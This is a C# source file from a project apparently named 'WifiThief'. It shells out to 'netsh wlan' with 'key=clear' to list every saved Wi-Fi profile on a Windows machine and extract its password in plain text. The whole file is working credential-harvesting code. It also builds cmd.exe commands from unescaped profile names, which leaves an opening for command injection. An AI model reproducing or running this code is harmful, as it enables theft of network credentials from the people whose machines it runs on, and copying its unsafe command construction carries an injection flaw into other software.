
using System.Diagnostics;

namespace WifiThief.Commands.Windows;

public class WindowsCommands
{
    public const string GetWifiNameCommandWindows = "netsh wlan show profiles";

    public static List<string> GetWifiNames()
    {
        var wifiNames = new List<string>();

        string output = RunCommand(GetWifiNameCommandWindows);

        string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

        foreach (string line in lines)
        {
            if (line.Contains("All User Profile"))
            {
                string name = line.Split(':', StringSplitOptions.TrimEntries)[1].Trim();
                wifiNames.Add(name);
            }
        }

        return wifiNames;
    }

    public static List<string> GetWifiPasswords(List<string> wifiNames)
    {
        var wifiPasswords = new List<string>(wifiNames.Count);

        foreach (string wifiName in wifiNames)
        {
            string output = RunCommand($"netsh wlan show profile name=\"{wifiName}\" key=clear");

            string password = FindAndExtractPassword(output);

            wifiPasswords.Add(password);
        }

        return wifiPasswords;
    }

    private static string FindAndExtractPassword(string output)
    {
        string[] lines = output.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

        foreach (string line in lines)
        {
            if (line.Contains("Key Content"))
            {
                return line.Split(':', StringSplitOptions.TrimEntries)[1].Trim();
            }
        }

        return string.Empty;
    }

    public static string RunCommand(string command)
    {
        var process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = $"/c \"{command}\"";
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;

        process.Start();

        string output = process.StandardOutput.ReadToEnd();

        process.WaitForExit();

        return output;
    }
}